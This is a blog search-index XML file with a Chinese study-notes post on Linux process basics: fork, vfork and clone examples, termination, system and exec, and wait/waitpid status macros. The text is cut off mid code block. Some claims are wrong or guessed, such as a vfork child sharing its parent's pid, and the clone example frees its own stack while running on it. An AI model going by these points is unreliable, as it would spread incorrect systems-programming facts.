<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>紫禁城之殇</title>
      <link href="/2024/10/28/%E7%B4%AB%E7%A6%81%E5%9F%8E%E4%B9%8B%E6%AE%87/"/>
      <url>/2024/10/28/%E7%B4%AB%E7%A6%81%E5%9F%8E%E4%B9%8B%E6%AE%87/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://blog.csdn.net/z961968549/article/details/80189737#:~:text=%E5%BD%93%E6%9F%90%E4%B8%AA%E8%BF%9B%E7%A8%8B%E6%94%B6%E5%88%B0%E4%BF%A1%E5%8F%B7%E6%97%B6#:~:text=%E5%BD%93%E6%9F%90%E4%B8%AA%E8%BF%9B%E7%A8%8B%E6%94%B6%E5%88%B0%E4%BF%A1%E5%8F%B7%E6%97%B6">linux进程相关函数(获取、销毁、切换···)_储处理器执行的代码-CSDN博客</a></p><p>参考：<a href="https://blog.csdn.net/gogokongyin/article/details/51178257">fork()、vfork()、clone()的区别_linux clone fork-CSDN博客</a></p><h1 id="0x1-从C函数走进子进程"><a href="#0x1-从C函数走进子进程" class="headerlink" title="0x1 从C函数走进子进程"></a>0x1 从C函数走进子进程</h1><h2 id="1-1-进程有关概念"><a href="#1-1-进程有关概念" class="headerlink" title="1.1 进程有关概念"></a>1.1 进程有关概念</h2><h3 id="1-1-1-进程"><a href="#1-1-1-进程" class="headerlink" title="1.1.1 进程"></a>1.1.1 进程</h3><p>程序是指存放指令的文件，存放在磁盘上，它是固定不变的，保存着指令的有序集合</p><p>进程是动起来的概念，可以理解成动起来的程序。（回头看看程序员自我修养是如何解释的）</p><p>进程时程序的执行过程，它一般分为三种状态：</p><p><strong>执行态</strong>：该进程正在运行，即正在使用CPU</p><p><strong>就绪态</strong>：该进程已经具备执行的一切条件，正在等待分配CPU的处理</p><p><strong>等待态</strong>：进程不能使用CPU，若等待事件发生（等待的资源分配到自身），将其唤醒。</p><p>进程的标识号是pid，它来区分不同的进程。</p><p>进程0调度进程时，常被称为交换进程，他不执行任何程序，是内核的一部分，因此被称为系统进程。进程除了自身ID外，还有父进程ID，每个进程都有一个父进程，操作系统不会无缘无故产生一个新进程<strong>。所有进程的祖先进程都是同一个进程叫做init进程，进程号是1。init进程是内核自举后的第一个启动进程</strong></p><p>iniit进程负责引导系统、启动守护（后台）进程并且运行必要的程序。<strong>它不是系统进程但是它以系统的超级用户特权运行。</strong></p><p><strong>父进程负责子进程空间的清理</strong></p><p><strong>并发</strong>：宏观上来看，只是因为执行速度快，看起来所有事情同时发生</p><p><strong>并行</strong>：同时执行，微观上真的同时执行，多个CPU同时执行不同的进程，多个进程真的在同时执行。</p><p><strong>同步</strong>：相同的步伐，进程间相互联系，或者共同完成某件事，需要相互协调</p><p><strong>异步</strong>：不同的步伐，进程间毫无关联。</p><p>从参考文献中读到这么一句话，发现对进程的描述很恰当。</p><p>Linux中，一个人在炒菜，快递打电话来了，让这个人去取快递，他可以叫他的儿子去取快递，自己继续炒菜。从CPU角度来想，由于CPU执行速度较快，看起来任务同时进行（并发进行），这样所有的事情都不耽误，这就是进程的意义。</p><h3 id="1-1-2-进程和线程的区别？"><a href="#1-1-2-进程和线程的区别？" class="headerlink" title="1.1.2 进程和线程的区别？"></a>1.1.2 进程和线程的区别？</h3><p>​      进程的四要素：</p><p>​       （1）有一段程序供其执行（不一定是一个进程所专有的），就像一场戏必须有自己的剧本。<br>​       （2）有自己的专用系统堆栈空间（私有财产）<br>​       （3）有进程控制块（task_struct）（“有身份证，PID”）<br>​       （4）有独立的存储空间。<br>​          缺少第四条的称为线程，如果完全没有用户空间称为内核线程，共享用户空间的称为用户线</p><h2 id="1-2-从C语言函数出发"><a href="#1-2-从C语言函数出发" class="headerlink" title="1.2 从C语言函数出发"></a>1.2 从C语言函数出发</h2><hr><h3 id="1-2-1-获取进程ID"><a href="#1-2-1-获取进程ID" class="headerlink" title="1.2.1 获取进程ID"></a>1.2.1 获取进程ID</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="type">void</span>)</span></span>; </span><br></pre></td></tr></table></figure><p><strong>功能：</strong>获取自己的进程<code>ID</code>号<br><strong>参数：</strong>无<br><strong>返回值：</strong>本进程的<code>ID</code>号</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>功能：</strong>获取自己的父进程<code>ID</code>号<br><strong>参数：</strong>无<br><strong>返回值：</strong>本进程的父进程的<code>ID</code>号</p><hr><h3 id="1-2-2-创建进程"><a href="#1-2-2-创建进程" class="headerlink" title="1.2.2 创建进程"></a>1.2.2 创建进程</h3><p>创建进程主要有三个函数fork vfork clone它们其实都是linux的系统调用，这三个函数分别调用了sys_fork、sys_vfork、sys_clone最终都调用了do_fork函数，差别在于参数的传递和一些基本的准备工作不同。</p><h4 id="1-2-2-1-fork"><a href="#1-2-2-1-fork" class="headerlink" title="1.2.2.1 fork"></a>1.2.2.1 fork</h4><p>生成一个进程，实际上是把父进程的资源task_struct，除了进程号。</p><p>fork只调用一次，但是会在父进程和子进程中分别返回两次，<strong>父进程中返回所创建子进程的pid</strong>，<strong>子进程中返回0</strong>。在fork()结束后，<strong>父进程和子进程的执行顺序不确定（基本是同步运行）</strong>，由高度程序决定谁先执行。<strong>不过可以在父进程中调用wait(）等待子进程结束。</strong></p><p>说到fork，得提到写时拷贝技术</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725447425374-34f85d01-61b6-41b4-993d-3739f43bc4f8.jpeg" alt="img"></p><p>我们都知道fork创建进程的时候，并没有真正的copy内存，因为对于fork来说，有一个exec系列的系统调用，它会勾引子进程另起炉灶。为了不让copy内存造成效率降低，linux引入了“写时复制技术”</p><p>换而言之，fork()之后exec之前两个进程用的是相同的物理空间（代码段、数据段、堆栈，仅仅是虚拟空间不同）。当父进程中有更改相应段的行为发生，如果不是因为exec产生，内核会给子进程的相应位置分配物理空间，但是代码段继续共享父进程的物理空间。如果是因为exec，由于两者执行的代码不同，子进程代码段也会分配单独的物理空间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork()) &#123;               <span class="comment">/* parent */</span></span><br><span class="line">        <span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In parent\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                    <span class="comment">/* child */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In child\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="1-2-2-2-vfork"><a href="#1-2-2-2-vfork" class="headerlink" title="1.2.2.2 vfork"></a>1.2.2.2 vfork</h4><p>我们从vfork()的产生原因来理解它会比较容易，因为fork()操作会将当前进程的任何资源几乎完全复制一份，其中包括了地址空间。一般fork()调用后都会跟着调用execve()，用新的内存镜像取代原来的内存镜像，当地址空间很大的时候，复制的操作会很费时，而且又是无用功，所以就产生了vfork。</p><p><code>vfork()</code>产生的子进程与父进程共享地址空间（代码段，数据段，堆栈），就没有了复制产生的开销。而且pid也是相同的。<br><code>vfork()</code>保证父进程在子进程调用<code>execve()</code>或<code>exit()</code>之前不会执行。</p><p>创建出来的进程不是真正意义上的进程，而是一个线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;count before fork = %d\n&quot;</span>, count);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">vfork</span>()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In parent: count = %d\n&quot;</span>, count);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In child:  count = %d\n&quot;</span>, ++count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意程序不能使用<code>return</code>语句退出（至少子进程不能使用），原因我猜测是<br><code>return</code>语句会使得<code>main</code>函数的栈被清空，因为是使用的同一个内存空间，子进程<br>把栈清空后，父进程的栈就被破坏了，于是就出错了。使用<code>exit()</code>可以避免这个问题。</p><h4 id="1-2-2-3-clone"><a href="#1-2-2-3-clone" class="headerlink" title="1.2.2.3 clone()"></a>1.2.2.3 clone()</h4><p>clone（）可以更细粒度与子进程共享资源，因而参数也更复杂，函数原型如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">clone</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *child_stack,</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="type">int</span> flags, <span class="type">void</span> *arg, ...</span></span></span><br><span class="line"><span class="params"><span class="function">          <span class="comment">/* pid_t *ptid, struct user_desc *tls, pid_t *ctid */</span> )</span></span>;</span><br></pre></td></tr></table></figure><p>根据man 2 clone上的描述，这个原型并不是最底层的调用，而是封装过的。</p><p>这里第一个参数fn是函数指针，我们知道进程的4要素，这个就是指向程序的指针，就是“剧本”</p><p>child_stack明显是为子进程分配系统堆栈空间（在linux下系统堆栈空间是2页面，就是8K的内存，其中在这块内存中，低地址上放入了值，这个值就是进程控制块task_struct的值），flags就是标志用来描述你需要从父进程继承那些资源， arg就是传给子进程的参数）。下面是flags可以取的值</p><table><thead><tr><th><strong>标志</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>CLONE_PARENT</td><td>创建的子进程的父进程是调用者的父进程，新进程与创建它的进程成了“兄弟”而不是“父子”</td></tr><tr><td>CLONE_FS</td><td>子进程与父进程共享相同的文件系统，包括root、当前目录、umask</td></tr><tr><td>CLONE_FILES</td><td>子进程与父进程共享相同的文件描述符（file descriptor）表</td></tr><tr><td>CLONE_NEWNS</td><td>在新的namespace启动子进程，namespace描述了进程的文件hierarchy</td></tr><tr><td>CLONE_SIGHAND</td><td>子进程与父进程共享相同的信号处理（signal handler）表</td></tr><tr><td>CLONE_PTRACE</td><td>若父进程被trace，子进程也被trace</td></tr><tr><td>CLONE_VFORK</td><td>父进程被挂起，直至子进程释放虚拟内存资源</td></tr><tr><td>CLONE_VM</td><td>子进程与父进程运行于相同的内存空间</td></tr><tr><td>CLONE_PID</td><td>子进程在创建时PID与父进程一致</td></tr><tr><td>CLONE_THREAD</td><td>Linux 2.4中增加以支持POSIX线程标准，子进程与父进程共享相同的线程群</td></tr></tbody></table><p>下面的例子是创建一个线程（子进程共享了父进程虚存空间，没有自己独立的虚存空间不能称其为进程）。父进程被挂起当子线程释放虚存资源后再继续执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIBER_STACK 8192</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">void</span> * stack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">do_something</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is son, the pid is:%d, the a is: %d\n&quot;</span>, <span class="built_in">getpid</span>(), ++a);</span><br><span class="line">    <span class="built_in">free</span>(stack); <span class="comment">//这里我也不清楚，如果这里不释放，不知道子线程死亡后，该内存是否会释放，知情者可以告诉下,谢谢</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">void</span> * stack;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    stack = <span class="built_in">malloc</span>(FIBER_STACK);<span class="comment">//为子进程申请系统堆栈</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!stack)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The stack failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;creating son thread!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clone</span>(&amp;do_something, (<span class="type">char</span> *)stack + FIBER_STACK, CLONE_VM|CLONE_VFORK, <span class="number">0</span>);<span class="comment">//创建子线程</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is father, my pid is: %d, the a is: %d\n&quot;</span>, <span class="built_in">getpid</span>(), a);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725449684249-0afc3bac-80fa-4891-a4ca-8d52230e81f1.jpeg" alt="img"></p><hr><h2 id="1-3-出发的转折点"><a href="#1-3-出发的转折点" class="headerlink" title="1.3 出发的转折点"></a>1.3 出发的转折点</h2><p>上面是我们用C语言最基本的进程创建函数。然而进程还有很多关联的东西，比如进程资源的销毁和释放，system和exec和进程的关系，比如每个进程背后的&#x2F;proc&#x2F;pid&#x2F;文件，比如ptrace和wait对进程的追踪和阻塞。为了我们更好的走进子进程，我们一步一步来看这些问题。</p><hr><h2 id="1-4-销毁进程"><a href="#1-4-销毁进程" class="headerlink" title="1.4 销毁进程"></a>1.4 销毁进程</h2><p>进程的常见的终止方式有5种：</p><h3 id="1-4-1-主动"><a href="#1-4-1-主动" class="headerlink" title="1.4.1 主动"></a>1.4.1 主动</h3><ul><li><code>main</code>函数的自然返回，<strong>注意：</strong><code>return</code>不是结束，只是函数结束，当它刚好结束的是<code>main</code>函数，此时导致进程结束。造成<code>return</code>结束进程的错觉。</li><li>调用<code>exit</code>函数 ，标准函数</li><li>调用<code>_exit</code>函数 ，系统调用函数</li><li>调用<code>abort</code>函数，产生<code>SIGABRT</code>信号</li></ul><hr><h3 id="1-4-2-被动"><a href="#1-4-2-被动" class="headerlink" title="1.4.2 被动"></a>1.4.2 被动</h3><ul><li>接收到某个信号，如<code>ctrl+c</code>，<code>SIGINT</code>，<code>ctrl+\ SIGOUT</code></li><li>通过<code>kill</code> 向进程发信号<br>前四四种正常的终止，后两种非正常的终止，但无论哪种方式，进程终止都会执行相同的关闭打来的文件，释放占用的内存资源，后两种终止会导致程序有些代码不能正常执行，比如对象的析构、<code>atexit</code>函数的执行。</li><li><code>exit</code>和<code>__exit</code>函数最大的区别在于<code>exit</code>函数退出之前会检查文件的打开情况，把文件缓冲区的内容写回文件，而<code>__exit</code>直接退出，什么意思？比如打开文件向文件写入内容，如果在文件没有关闭，也没有调用同步到磁盘的函数，文件并没有同步到磁盘，只存在缓冲区内，这时调用<code>exit</code>，那么进程结束时，缓冲区的内容可以同步到文件中，内容已经存在在文件之中了，调用<code>__exit</code>进程直接结束，文件不会有写入的内容。</li></ul><hr><h3 id="1-4-3-问题"><a href="#1-4-3-问题" class="headerlink" title="1.4.3 问题"></a>1.4.3 问题</h3><p>从上面可以看出，我们程序常见的退出出口基本上都会造成进程的销毁，这是必然的设计。</p><hr><h2 id="1-5-system和exec"><a href="#1-5-system和exec" class="headerlink" title="1.5 system和exec"></a>1.5 system和exec</h2><hr><h3 id="1-5-1-system启动一个新进程"><a href="#1-5-1-system启动一个新进程" class="headerlink" title="1.5.1 system启动一个新进程"></a>1.5.1 system启动一个新进程</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">       <span class="function"><span class="type">int</span> <span class="title">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>功能：</strong>打开命令或者程序<br><strong>参数：</strong>带路径的程序启动文件，或者在启动变量里声明的程序直接写程序名<br><strong>返回值：</strong><code>-1</code>失败<br>打开的程序是另一个进程，也可以成为此程序的子进程，因此子进程不一定和父进程视同一个程序，在成功打开所要执行的文件之后，父进程才能继续执行。</p><hr><h3 id="1-5-2-进程替换，exec函数族"><a href="#1-5-2-进程替换，exec函数族" class="headerlink" title="1.5.2 进程替换，exec函数族"></a>1.5.2 进程替换，exec函数族</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg, ...)</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *arg, ...)</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg,</span></span></span><br><span class="line"><span class="params"><span class="function">                 ..., <span class="type">char</span> * <span class="type">const</span> envp[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> *<span class="type">const</span> argv[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execvpe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[],</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="type">char</span> *<span class="type">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure><p>这四个函数第一个参数都是可执行程序或者脚本的程序名，<code>execl</code>、<code>execv</code>需要带有完整的路径，第二参数为任意字符，起到占位作用，第三个或者后面的字符为调用者的参数，参数列表最后以<code>NULL</code>结尾，而<code>execlp</code>、<code>execvp</code>只需要带有可执行程序的名称即可，系统自动去环境变量去寻找同名文件，<code>execl</code>、<code>execlp</code>需要<code>NULL</code>结尾.</p><p>函数后缀说明：<br><code>l</code> <code>v</code>：参数呈现形式<br><strong>l</strong>:<code>list</code> 参数一个个的列出来<br><strong>v</strong>：<code>vector</code> 参数用数组存储起来<br><strong>p</strong>：目标程序，可以省略路径<br><strong>e</strong>:环境变量，不考虑</p><h2 id="1-6-wait与ptrace"><a href="#1-6-wait与ptrace" class="headerlink" title="1.6 wait与ptrace"></a>1.6 wait与ptrace</h2><h3 id="1-6-1-wait"><a href="#1-6-1-wait" class="headerlink" title="1.6.1 wait"></a>1.6.1 wait</h3><p>前面我们知道wait可以等待子进程结束后再执行父进程，其主要起到一个进程同步的作用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">wait</span><span class="params">(<span class="type">int</span> *status)</span></span>;</span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> *status, <span class="type">int</span> options)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="1-6-1-1-pid-t-wait-int-status"><a href="#1-6-1-1-pid-t-wait-int-status" class="headerlink" title="1.6.1.1 pid_t wait(int *status);"></a>1.6.1.1 pid_t wait(int *status);</h4><p>函数返回值为结束子进程的进程号，如果当前进程中没有子进程则返回-1。</p><p>参数为子进程结束状态指针，该指针是一个int类型的指针，如果单纯地想等待子进程结束而不关心进程结束状态，参数写入NULL；若想获得子进程结束状态，将参数地址写入即可，例如int statue存储子进程的解释状态，函数调用wait(&amp;statue)即可。</p><h4 id="1-6-1-2-pid-t-waitpid-pid-t-pid-int-status-int-options"><a href="#1-6-1-2-pid-t-waitpid-pid-t-pid-int-status-int-options" class="headerlink" title="1.6.1.2 pid_t waitpid(pid_t pid, int *status, int options);"></a>1.6.1.2 pid_t waitpid(pid_t pid, int *status, int options);</h4><p>第一个参数<strong>pid：</strong>从参数的名字<code>pid</code>和类型<code>pid_t</code>中就可以看出，这里需要的是一个进程<code>ID</code>。但当<code>pid</code>取不同的值时，在这里有不同的意义。</p><ul><li>pid&gt;0时，只等待进程<code>ID</code>等于<code>pid</code>的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，<code>waitpid</code>就会一直等下去。</li><li>pid&#x3D;&#x3D;-1时，等待任何一个子进程退出，没有任何限制，此时<code>waitpid</code>和<code>wait</code>的作用一模一样。</li><li>pid&#x3D;&#x3D;0时，等待同一个进程组中的任何子进程，如果子进程已经加入了别的进程组，<code>waitpid</code>不会对它做任何理睬。</li><li>pid&lt;-1时，等待一个指定进程组中的任何子进程，这个进程组的<code>ID</code>等于<code>pid</code>的绝对值。<br>第二个参数与<code>wait</code>相同，存储制定子进程终止的状态信息。为整形指针类型。</li></ul><p>第二个参数<strong>options：</strong><code>options</code>提供了一些额外的选项来控制<code>waitpid</code>，目前在Liunx中只支持下面三个选项，这是三个常数，可以用”|”运算符把它们连接起来使用。</p><ul><li><strong>WNOHANG：</strong>如果没有子项退出，则立即返回。</li><li><strong>WUNTRACED</strong>：如果 Child 已停止（但未通过 ptrace（2） 跟踪），则返回 Child。 即使未指定此选项，也会提供已停止的跟踪子项的状态。</li><li><strong>WCONTINUED</strong> (since Linux 2.6.10)：如果已通过 SIGCONT 的交付恢复了停止的子项，则也会返回</li></ul><p>返回值和错误：</p><p><code>waitpid</code>的返回值比<code>wait</code>稍微复杂一些，一共有3种情况：</p><ul><li>当正常返回的时候，<code>waitpid</code>返回收集到的子进程的进程<code>ID</code>；</li><li>如果设置了选项<code>WNOHANG</code>，而调用中<code>waitpid</code>发现没有已退出的子进程可收集，则返回<code>0</code>；</li><li>如果调用中出错，则返回<code>-1</code>，这时<code>errno</code>会被设置成相应的值以指示错误所在；当<code>pid</code>所指示的子进程不存在，或此进程存在，但不是调用进程的子进程，<code>waitpid</code>就会出错返回，这时<code>errno</code>被设置为<code>ECHILD</code>；</li></ul><hr><h4 id="1-6-1-3-wstatus状态"><a href="#1-6-1-3-wstatus状态" class="headerlink" title="1.6.1.3 wstatus状态"></a>1.6.1.3 wstatus状态</h4><p>接下来简单介绍下wstatus，如果它不是空的，上面提到的两个wait相关函数会在这个int指针上存储状态信息。下面的宏（macros）将整数作为参数。</p><ul><li><p>**WIFEXITED(wstatus)**：如果子进程正常终止，即通过调用 exit（3） 或 _exit（2），或者从 main（） 返回，则返回 true。</p></li><li><p>**WEXITSTATUS(wstatus)**：返回 Child 的退出状态。 这包括子级在调用 exit（3） 或 _exit（2） 时指定或作为 main（） 中 return 语句的参数的 status 参数的最低有效 8 位。 只有在以下情况下，才应使用此宏WIFEXITED 返回 true。</p></li><li><p>**WIFSIGNALED(wstatus)**：如果子进程被 Signal 终止，则返回 true。</p></li><li><p>**WTERMSIG(wstatus)**：返回导致子进程终止的信号的编号。 仅当 WIFSIGNALED 返回 true 时，才应使用此宏。</p></li><li><p>**WCOREDUMP(wstatus)**：如果子对象生成了 core dump，则返回 true（参见 core（5））。 仅当 WIFSIGNALED 返回 true 时，才应使用此宏。</p></li><li><ul><li>此宏未在 POSIX.1-2001 中指定，并且在某些 UNIX 实现（例如 AIX、SunOS）上不可用。 因此，在 WCOREDUMP 中关闭其使用 #ifdef … #endif。</li></ul></li><li><p>**WIFSTOPPED(wstatus)**：如果子进程因传递信号而停止，则返回 true;仅当调用是使用 WUNTRACED 完成的时，才有可能这样做或者当 child 被追踪时（参见 ptrace（2））。</p></li><li><p>**WSTOPSIG(wstatus)**：返回导致 Child 停止的信号的编号。 仅当 WIFSTOPPED 返回 true 时，才应使用此宏。</p></li><li><p>**WIFCONTINUED(wstatus):**（自 Linux 2.6.10 起）如果子进程通过交付 SIGCONT 恢复，则返回 true。</p></li></ul><p>宏的对应整数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 